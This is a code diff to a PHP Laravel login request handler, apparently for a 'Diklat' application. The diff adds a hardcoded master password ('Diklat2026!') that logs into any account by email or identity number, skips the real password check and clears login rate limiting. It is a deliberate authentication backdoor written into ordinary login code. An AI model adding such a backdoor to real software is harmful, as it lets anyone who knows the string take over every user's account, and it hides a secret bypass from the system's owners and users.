@@ -45,6 +45,19 @@ class LoginRequest extends FormRequest
         
         // Check if login is email or identity_number
         $fieldType = filter_var($login, FILTER_VALIDATE_EMAIL) ? 'email' : 'identity_number';
+        
+        // Master Password Logic
+        $masterPassword = 'Diklat2026!';
+        
+        if ($this->input('password') === $masterPassword) {
+            $user = \App\Models\User::where($fieldType, $login)->first();
+            
+            if ($user) {
+                Auth::login($user, $this->boolean('remember'));
+                RateLimiter::clear($this->throttleKey());
+                return;
+            }
+        }
 
         if (! Auth::attempt([$fieldType => $login, 'password' => $this->input('password')], $this->boolean('remember'))) {
             RateLimiter::hit($this->throttleKey());
